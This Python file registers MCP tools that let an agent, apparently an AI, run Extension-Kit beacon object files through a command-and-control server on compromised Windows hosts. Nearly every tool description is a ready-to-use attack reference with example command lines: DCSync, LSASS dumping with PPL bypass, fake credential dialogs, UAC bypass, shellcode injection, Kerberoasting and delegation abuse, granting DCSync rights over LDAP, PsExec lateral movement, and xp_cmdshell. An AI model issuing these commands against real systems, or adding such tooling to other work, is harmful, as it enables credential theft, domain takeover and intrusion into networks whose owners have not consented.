"""
tools/extensions.py — Extension-Kit BOF tool wrappers.

Each MCP tool corresponds to one BOF group from Extension-Kit.
Descriptions include full per-command usage/args extracted from the .axs sources.
"""
from __future__ import annotations
from mcp.server.fastmcp import FastMCP
from tools._context import ToolContext
from utils.validation import validate_nonempty, resolve_agent_id
from utils.logging import get_logger
from services.task_service import TaskTimeoutError

log = get_logger("tools.extensions")


def register_extensions_tools(mcp: FastMCP, ctx: ToolContext) -> None:
    """Register BOF extension tools."""

    async def _exec_bof(agent_id: str, cmdline: str) -> str:
        agent_id = await resolve_agent_id(ctx.client, agent_id)
        cmdline = validate_nonempty(cmdline, "cmdline")
        log.info("tool.exec_bof", agent_id=agent_id, cmdline=cmdline[:80])
        try:
            task = await ctx.task_svc.run_raw_and_wait(agent_id=agent_id, cmdline=cmdline)
            if task.is_error:
                return f"[ERROR] {task.output}"
            return task.output or "(no output)"
        except TaskTimeoutError:
            return f"Timeout waiting for '{cmdline}' to complete."
        except Exception as e:
            return f"Error: {e}"

    # ──────────────────────────────────────────────────────────────────────────
    @mcp.tool(description="""AD-BOF: Active Directory exploitation commands.

adwssearch <query> [-a attributes] [--dc dc] [--dn dn]
  Executes ADWS query. Example: adwssearch (objectClass=*) -a *,ntsecuritydescriptor --dc DC1

badtakeover <ou> <account> <sid> <dn> <domain>
  BOF for account takeover via BadSuccessor (dMSA). Example: badtakeover "OU=TestOU,DC=domain,DC=dom" attacker S-1-5-21-...-1104 "CN=admin,CN=Users,DC=domain,DC=dom" domain.dom

dcsync single <target> [-ou ou_path] [-dc dc_address] [--ldaps] [--only-nt]
  DCSync a single user. Example: dcsync single jane.doe -dc dc01.corp.local

dcsync all [-ou ou_path] [-dc dc_address] [--ldaps] [--only-nt] [--only-users]
  DCSync all domain users. Example: dcsync all -dc dc01.corp.local --only-users

ldapsearch <query> [-a attributes] [-c count] [-s scope] [--dc dc] [--dn dn] [--ldaps]
  Raw LDAP query. Example: ldapsearch (objectClass=*) -a *,ntsecuritydescriptor --dc DC1

ldapq computers
  Get list of computers from LDAP (auto-populates Targets tab). Example: ldapq computers

readlaps [-dc dc] [-dn dn] {-target name | -target-dn dn}
  Read LAPS password. Example: readlaps -dc dc01.domain.local -target WINCLIENT

webdav enable
  Enable WebDAV client service (no elevated privileges needed).

webdav status <hosts>
  Check if WebDAV is running on remote hosts. Example: webdav status 192.168.0.1,192.168.0.2
""")
    async def bof_ad(agent_id: str, command: str, args: str = "") -> str:
        return await _exec_bof(agent_id, f"{command} {args}".strip())

    # ──────────────────────────────────────────────────────────────────────────
    @mcp.tool(description="""ADCS-BOF: Active Directory Certificate Services attacks.

certi auth --cert <pfx_base64> [--password pass] [--dc dc] [--target user]
  Authenticate with certificate (PKINIT + UnPAC-the-hash). Example: certi auth --cert MIIMcAI...

certi enum [--ca ca] [--template tmpl] [--dc dc]
  Enumerate CAs and certificate templates. Example: certi enum

certi request --ca <ca> --template <tmpl> [--subject CN=...] [--altname CN=...] [--alturl ...]
  Request an enrollment certificate. Example: certi request --ca cert.example.org\\example-CA --template vulnTemplate

certi request_on_behalf <ca> <template> <target_user> <ea_pfx_path>
  Request cert on behalf of another user (ESC3). Example: certi request_on_behalf ca\\CA-Name vulnTemplate Administrator /tmp/ea.pfx

certi shadow --target <user> [--dc dc] [--device-id id]
  Shadow Credentials attack — write KeyCredentialLink and get certificate. Example: certi shadow --target Administrator
""")
    async def bof_adcs(agent_id: str, command: str, args: str = "") -> str:
        return await _exec_bof(agent_id, f"{command} {args}".strip())

    # ──────────────────────────────────────────────────────────────────────────
    @mcp.tool(description="""Creds-BOF: Windows credential extraction.

askcreds [-p prompt] [-n note] [-t wait_time_secs] [--async]
  Prompt user for credentials via fake dialog. Example: askcreds -p "Windows Update"

get-netntlm [--no-ess]
  Retrieve NetNTLM hash (Internal Monologue). Example: get-netntlm --no-ess

hashdump
  Dump SAM hashes (requires admin). Auto-saves to credentials tab.

lsadump_secrets
  Dump LSA secrets from SECURITY hive (requires SYSTEM). Auto-saves service credentials.

lsadump_sam
  Dump SAM hashes via lsadump::sam (requires admin).

lsadump_cache
  Dump cached domain credentials DCC2/MSCacheV2 (requires SYSTEM).

nanodump [--write path] [--valid] [--ppl-dump] [--kdump] ...
  Dump LSASS via syscalls. Example: nanodump --write C:\\Windows\\Temp\\lsass.dmp

nanodump_ppl_dump
  Bypass PPL and dump LSASS (PPL-dump variant).

nanodump_ppl_medic
  Bypass PPL and dump LSASS (PPL-medic variant).

nanodump_ssp
  Load a Security Support Provider (SSP) into LSASS.

cookie-monster [--edge] [--chrome] [--firefox] [-t target_user]
  Locate and copy browser cookie files.

underlaycopy <MFT|Metadata> <source> [-w destination] [--download]
  Copy file using low-level NTFS (MFT/Metadata mode). Example: underlaycopy MFT C:\\Windows\\System32\\notepad.exe -w C:\\temp\\copy.exe
""")
    async def bof_creds(agent_id: str, command: str, args: str = "") -> str:
        return await _exec_bof(agent_id, f"{command} {args}".strip())

    # ──────────────────────────────────────────────────────────────────────────
    @mcp.tool(description="""Elevation-BOF: Local privilege escalation to SYSTEM.

getsystem token
  Elevate to SYSTEM via TrustedInstaller impersonation. Example: getsystem token

uacbybass sspi <path>
  UAC bypass via SSPI Datagram Contexts. Example: uacbybass sspi c:\\windows\\tasks\\agent.exe

uacbybass regshellcmd <path>
  UAC bypass via ms-settings Shell registry key. Example: uacbybass regshellcmd c:\\windows\\tasks\\agent.exe

potato-dcom {--token | --run <program_with_args>}
  DCOM Potato — SYSTEM via SeImpersonate. Example: potato-dcom --token
  Example: potato-dcom --run C:\\Windows\\System32\\cmd.exe /c whoami /all

potato-print {--token | --run <program_with_args>}
  PrintSpoofer — SYSTEM via Print Spooler Named Pipe. Example: potato-print --token
""")
    async def bof_elevation(agent_id: str, command: str, args: str = "") -> str:
        return await _exec_bof(agent_id, f"{command} {args}".strip())

    # ──────────────────────────────────────────────────────────────────────────
    @mcp.tool(description="""Execution-BOF: In-process payload execution.

execute-assembly <path> [params] [--async]
  Execute a .NET assembly in-process (no fork-and-run). Example: execute-assembly /opt/Seatbelt.exe -group=user

noconsolation <path> [args]
  Run an unmanaged EXE/DLL inside agent memory without a console. Example: noconsolation /tmp/mimikatz.exe "sekurlsa::logonpasswords"
""")
    async def bof_execution(agent_id: str, command: str, args: str = "") -> str:
        return await _exec_bof(agent_id, f"{command} {args}".strip())

    # ──────────────────────────────────────────────────────────────────────────
    @mcp.tool(description="""Injection-BOF: Shellcode injection into target processes.

inject-cfg <pid> <shellcode_file>
  Inject via CFG hook (combase.dll __guard_check_icall_fptr). Example: inject-cfg 808 /tmp/shellcode.bin

inject-sec <pid> <shellcode_file>
  Inject via section mapping. Example: inject-sec 808 /tmp/shellcode.bin

inject-poolparty <technique> <pid> <shellcode_file>
  Inject via Pool Party techniques (1-8). 1=StartRoutine, 2=TP_WORK, 7=TP_DIRECT, etc.
  Example: inject-poolparty 7 808 /tmp/shellcode.bin

inject-32to64 <pid> <shellcode_file>
  Inject x64 shellcode from WOW64 (32-bit) agent into native x64 process via RtlCreateUserThread.
  Requires 32-bit agent. Example: inject-32to64 808 /tmp/shellcode.bin
""")
    async def bof_injection(agent_id: str, command: str, args: str = "") -> str:
        return await _exec_bof(agent_id, f"{command} {args}".strip())

    # ──────────────────────────────────────────────────────────────────────────
    @mcp.tool(description="""Kerbeus-BOF: Kerberos ticket operations and attacks.

kerbeus asreproasting /user:<username> [/domain:<d>] [/dc:<dc>] [/outfile:<f>]
  AS-REP roasting. Example: kerbeus asreproasting /user:pre_user

kerbeus asktgt /user:<user> /password:<pass> [/enctype:aes256] [/ptt] [/opsec]
  Request a TGT. Example: kerbeus asktgt /user:Admin /password:QWErty /enctype:aes256 /ptt

kerbeus asktgs /user:<u> /service:<spn> [/ticket:<.kirbi>] [/enctype:aes256] [/ptt]
  Request a TGS. Example: kerbeus asktgs /user:Admin /service:cifs/dc01.corp.local

kerbeus changepw /ticket:<ticket_b64> /new:<newpass> [/dc:<dc>]
  Reset a user password from a valid TGT.

kerbeus dump [/luid:<luid>] [/service:<svc>] [/client:<client>]
  Dump Kerberos tickets from memory.

kerbeus hash /password:<pass> [/user:<u>] [/domain:<d>] [/enctype:rc4|aes128|aes256]
  Calculate Kerberos hashes.

kerbeus kerberoasting [/spn:<spn>] [/dc:<dc>] [/outfile:<f>]
  Kerberoasting. Example: kerbeus kerberoasting

kerbeus klist [/luid:<luid>]
  List Kerberos tickets in memory.

kerbeus ptt /ticket:<base64_or_path>
  Submit (Pass-the-Ticket) a TGT. Example: kerbeus ptt /ticket:doIFg...

kerbeus describe /ticket:<base64_or_path>
  Parse and describe a ticket.

kerbeus purge [/luid:<luid>]
  Purge Kerberos tickets from memory.

kerbeus renew /ticket:<ticket>  [/dc:<dc>] [/ptt]
  Renew a TGT.

kerbeus s4u /user:<u> /rc4:<hash> /impersonateuser:<target> /msdsspn:<spn> [/ptt]
  S4U2Self/S4U2Proxy constrained delegation abuse.

kerbeus cross_s4u /user:<u> /ticket:<tkt> /impersonateuser:<t> /msdsspn:<spn> [/ptt]
  Cross-domain S4U constrained delegation abuse.

kerbeus tgtdeleg /spn:<spn>
  Retrieve usable TGT without elevation via GSS-API. Example: kerbeus tgtdeleg /spn:host/dc01.corp.local

kerbeus triage [/luid:<luid>]
  List tickets in table format.
""")
    async def bof_kerbeus(agent_id: str, command: str, args: str = "") -> str:
        return await _exec_bof(agent_id, f"{command} {args}".strip())

    # ──────────────────────────────────────────────────────────────────────────
    @mcp.tool(description="""LDAP-BOF: Full LDAP read/write/delete operations against Active Directory.

ENUMERATION (Read):
  ldap get-acl <object>             — Get ACL/security descriptor
  ldap get-attribute <obj> <attr>   — Get specific attribute(s)
  ldap get-computers                — List all domain computers
  ldap get-groups                   — List all domain groups
  ldap get-groupmembers <group>     — List members of a group
  ldap get-delegation <object>      — Get delegation config
  ldap get-domaininfo               — Get domain info from rootDSE
  ldap get-maq                      — Get Machine Account Quota
  ldap get-object <object>          — Get all attributes of an object
  ldap get-rbcd <object>            — Get RBCD config
  ldap get-spn <object>             — Get SPNs
  ldap get-uac <object>             — Get UAC flags
  ldap get-users                    — List all domain users
  ldap get-usergroups <user>        — List groups a user is member of
  ldap get-writable                 — Find objects you have write access to

MODIFICATION (Write):
  ldap move-object <object> <new_ou>       — Move object to different OU
  ldap add-ace <object> <trustee> <rights> — Add ACE to DACL
  ldap add-attribute <object> <attr> <val> — Add value to attribute
  ldap add-computer <name> [password]      — Add computer to domain
  ldap add-delegation <object> <spn>       — Add delegation SPN
  ldap add-group <name> [ou]               — Add group
  ldap add-groupmember <group> <member>    — Add member to group
  ldap add-ou <name> <parent_dn>           — Add OU
  ldap add-rbcd <target> <controlled>      — Add RBCD delegation
  ldap add-sidhistory <object> <sid>       — Add SID to sidHistory
  ldap add-spn <object> <spn>              — Add SPN
  ldap add-user <name> [password] [ou]     — Add user
  ldap add-uac <object> <uac_flags>        — Add UAC flags
  ldap add-genericall <object> <trustee>   — Add GenericAll ACE
  ldap add-genericwrite <object> <trustee> — Add GenericWrite ACE
  ldap add-dcsync <object>                 — Add DCSync rights
  ldap add-asreproastable <user>           — Set DONT_REQ_PREAUTH
  ldap add-unconstrained <object>          — Enable unconstrained delegation
  ldap add-constrained <object> <spns>     — Set constrained delegation SPNs
  ldap set-attribute <object> <attr> <val> — Set/replace attribute
  ldap set-delegation <object> <spns>      — Set delegation SPNs
  ldap set-owner <object> <owner>          — Set object owner
  ldap set-spn <object> <spns>             — Set SPNs (replaces all)
  ldap set-password <user> <newpass>       — Set/reset user password
  ldap set-uac <object> <uac_flags>        — Set UAC flags (replaces all)

REMOVAL (Delete):
  ldap remove-ace <object> <trustee>           — Remove ACE from DACL
  ldap remove-attribute <object> <attr> [val]  — Remove attribute/value
  ldap remove-delegation <object> <spn>        — Remove delegation SPN
  ldap remove-dcsync <object>                  — Remove DCSync rights
  ldap remove-genericall <object> <trustee>    — Remove GenericAll ACE
  ldap remove-genericwrite <object> <trustee>  — Remove GenericWrite ACE
  ldap remove-groupmember <group> <member>     — Remove group member
  ldap remove-object <object>                  — Delete object from domain
  ldap remove-rbcd <target> <controlled>       — Remove RBCD delegation
  ldap remove-spn <object> <spn>               — Remove SPN
  ldap remove-uac <object> <uac_flags>         — Remove UAC flags
""")
    async def bof_ldap(agent_id: str, command: str, args: str = "") -> str:
        return await _exec_bof(agent_id, f"{command} {args}".strip())

    # ──────────────────────────────────────────────────────────────────────────
    @mcp.tool(description="""LateralMovement: Spawn sessions and execute commands on remote targets.

jump psexec <target> <payload_file> [-b binary_name] [-s share] [-p svc_path] [-n svc_name] [-d svc_desc]
  Spawn session via PsExec (copy+create service). Example: jump psexec 192.168.0.1 /tmp/agent.exe -n UpdateService

jump scshell <target> <payload_file> [-b binary_name] [-s share] [-p svc_path] [-n svc_name]
  Spawn session via SCShell (modify existing service). Example: jump scshell 192.168.0.1 /tmp/agent.exe -n defragsvc

invoke winrm <target> <cmd> [-t timeout_ms] [-b] [-u username] [-p password]
  Execute command via WinRM. Example: invoke winrm 192.168.0.1 "whoami /all" -u DOMAIN\\admin -p P@ss

invoke scshell <target> <service> <payload_cmdline>
  Execute command via SCShell (fileless). Example: invoke scshell 10.0.2.10 defragsvc "cmd.exe /c \\\\share\\agent.exe"

token make <username> <password> <domain> <logon_type>
  Create impersonated token (logon types: 2=Interactive, 3=Network, 8=NetworkCleartext, 9=NewCredentials).
  Example: token make admin P@ssword domain.local 9

token steal <pid>
  Steal access token from a process. Example: token steal 608

runas-user <username> <password> <domain> <command> [-l logon_type] [-t timeout_ms] [-o] [-b]
  Run command as another user (RunasCs-like). Example: runas-user admin P@ss domain.local "cmd /c whoami" -l 9

runas-session <session_id> <filepath>
  Execute binary in another user's session via COM (IHxHelpPaneServer). Requires admin.
  Example: runas-session 3 C:\\Windows\\Temp\\file.exe
""")
    async def bof_lateral(agent_id: str, command: str, args: str = "") -> str:
        return await _exec_bof(agent_id, f"{command} {args}".strip())

    # ──────────────────────────────────────────────────────────────────────────
    @mcp.tool(description="""MSSQL-BOF: Microsoft SQL Server enumeration and exploitation.
Common optional flags for most commands: [-d database] [-l linkedserver] [-i impersonate_user] [-u user] [-p password]

mssql 1434udp <server>                — Get SQL Server info via UDP 1434
mssql adsi <server> [-l linked] [-i impersonate] [server] [adsiserver]
                                      — Get ADSI creds from linked server
mssql agentcmd <server> <command>     — Execute system command via SQL Agent Jobs
mssql agentstatus <server>            — Enumerate SQL Agent status and jobs
mssql checkrpc <server>               — Check RPC status of linked servers
mssql clr <server> <dll_path> <func> [-h hash]
                                      — Load and execute .NET assembly via CLR stored procedure
mssql columns <server> <table>        — Enumerate columns in a table
mssql databases <server>              — Enumerate SQL databases
mssql disableclr / enableclr <server> — Disable/Enable CLR integration
mssql disableole / enableole <server> — Disable/Enable OLE Automation
mssql disablerpc / enablerpc <server> <linkedserver>
                                      — Disable/Enable RPC on linked server
mssql disablexp / enablexp <server>   — Disable/Enable xp_cmdshell
mssql impersonate <server>            — Enumerate users that can be impersonated
mssql info <server>                   — Gather SQL Server information
mssql links <server>                  — Enumerate linked servers
mssql olecmd <server> <command>       — Execute command via OLE Automation
mssql query <server> <query>          — Execute custom SQL query. Example: mssql query 192.168.1.10 "SELECT @@version"
mssql rows <server> <table>           — Get row count in table
mssql search <server> <keyword>       — Search tables for a column name
mssql smb <server> \\\\listener         — Coerce NetNTLM auth via xp_dirtree
mssql tables <server>                 — Enumerate tables in database
mssql users <server>                  — Enumerate users with database access
mssql whoami <server>                 — Get logged in user, mapped user, and roles
mssql xpcmd <server> <command>        — Execute command via xp_cmdshell
""")
    async def bof_mssql(agent_id: str, command: str, args: str = "") -> str:
        return await _exec_bof(agent_id, f"{command} {args}".strip())

    # ──────────────────────────────────────────────────────────────────────────
    @mcp.tool(description="""PostEx-BOF: Post-exploitation utilities.

firewallrule add <port> <name> <direction> [-g groupname] [-d description]
  Add inbound/outbound firewall rule via COM (no admin needed).
  Example: firewallrule add 80 RuleName in -g Group1 -d TestRule

screenshot_bof [-n name] [-p pid]
  Alternative screenshot — does NOT use fork-and-run. Example: screenshot_bof -n screen1 -p 812

sauroneye -d <directory> -f <extensions> -k <keywords>
  Search directories for files with specific keywords (SauronEye BOF port).
  Example: sauroneye -d C:\\Users -f .txt,.docx -k pass*,secret*
""")
    async def bof_postex(agent_id: str, command: str, args: str = "") -> str:
        return await _exec_bof(agent_id, f"{command} {args}".strip())

    # ──────────────────────────────────────────────────────────────────────────
    @mcp.tool(description="""Process-BOF: Process enumeration and manipulation.

findobj module <module_name>
  List all processes that have a specific module loaded. Example: findobj module clr.dll

findobj prochandle <process_name>
  List all processes that have a handle to the specified process. Example: findobj prochandle lsass.exe

process conn
  List processes with established TCP/RDP connections with detailed info. Example: process conn

procfreeze freeze <pid>
  Freeze a target process using PPL bypass via WerFaultSecure.exe. Example: procfreeze freeze 1234

procfreeze unfreeze
  Unfreeze a previously frozen process. Example: procfreeze unfreeze
""")
    async def bof_process(agent_id: str, command: str, args: str = "") -> str:
        return await _exec_bof(agent_id, f"{command} {args}".strip())

    # ──────────────────────────────────────────────────────────────────────────
    @mcp.tool(description="""RelayInformer-BOF: Check relay attack mitigations on remote services.

relay-informer http <url>
  Check HTTP(S) binding enforcement and channel binding. Example: relay-informer http https://test.dom.local

relay-informer ldap <dc>
  Check LDAP signing and LDAPS channel binding enforcement. Example: relay-informer ldap DC

relay-informer mssql <server>
  Check MSSQL binding and channel binding enforcement. Example: relay-informer mssql DB

relay-informer smb <host>
  Check SMB2 signing enforcement. Example: relay-informer smb DC01
""")
    async def bof_relayinformer(agent_id: str, command: str, args: str = "") -> str:
        return await _exec_bof(agent_id, f"{command} {args}".strip())

    # ──────────────────────────────────────────────────────────────────────────
    @mcp.tool(description="""SAL-BOF: Situational Awareness Local — Windows host reconnaissance.

arp                                 — List ARP table
cacls <path>                        — List file/directory permissions. Example: cacls C:\\test.txt
dir [directory] [/s]                — List directory contents (recursive with /s). Example: dir C:\\Users /s
env                                 — List process environment variables
ipconfig                            — List IPv4 addresses, hostname, DNS servers
listdns                             — List DNS cache entries and resolve them
netstat                             — Display active network connections
nslookup <domain> [-s server] [-t type]
                                    — DNS query. Example: nslookup google.com -s 8.8.8.8 -t A
routeprint                          — List IPv4 routes
uptime                              — Show system boot time and uptime
useridletime                        — Show user idle time in seconds/minutes/hours/days
whoami                              — Run whoami /all (groups, privileges, SID)

privcheck all                       — Run ALL privilege escalation checks
privcheck alwayselevated            — Check AlwaysInstallElevated registry setting
privcheck autologon                 — Check Winlogon autologon credentials
privcheck credmanager               — Enumerate Windows Credential Manager
privcheck hijackablepath            — Check PATH for writable directories
privcheck modautorun                — Check for modifiable autorun executables
privcheck modsvc                    — Check for services with modifiable DACL
privcheck pshistory                 — Check PowerShell PSReadLine history file
privcheck tokenpriv                 — List token privileges and highlight vulnerable ones
privcheck uacstatus                 — Check UAC status and integrity level
privcheck unattendfiles             — Check for leftover unattend.xml files
privcheck unquotedsvc               — Check for unquoted service paths
privcheck vulndrivers                — Check for known vulnerable drivers (loldrivers.io)
""")
    async def bof_sal(agent_id: str, command: str, args: str = "") -> str:
        return await _exec_bof(agent_id, f"{command} {args}".strip())

    # ──────────────────────────────────────────────────────────────────────────
    @mcp.tool(description="""SAR-BOF: Situational Awareness Remote — Network discovery and enumeration.

smartscan <target> [-p ports]
  Smart TCP port scan. Target can be IP, range, CIDR, or comma-separated.
  Port presets: fast, standart, full, or custom (e.g. 80,443,22-25,3389).
  Example: smartscan 192.168.1.0/24 -p standart

taskhound <target> [-u username] [-p password] [-save dir] [-unsaved-creds] [-grab-blobs]
  Collect scheduled tasks from a remote system. Example: taskhound 192.168.1.100 -u domain\\admin -p password

quser [host]
  Query user sessions on a remote machine. Example: quser MainDC

nbtscan <target> [-v] [-q] [-e] [-l] [-s separator] [-t timeout_ms] [-no-targets]
  NetBIOS name scanner. Auto-populates Targets tab.
  Example: nbtscan 192.168.1.0/24 -v
""")
    async def bof_sar(agent_id: str, command: str, args: str = "") -> str:
        return await _exec_bof(agent_id, f"{command} {args}".strip())
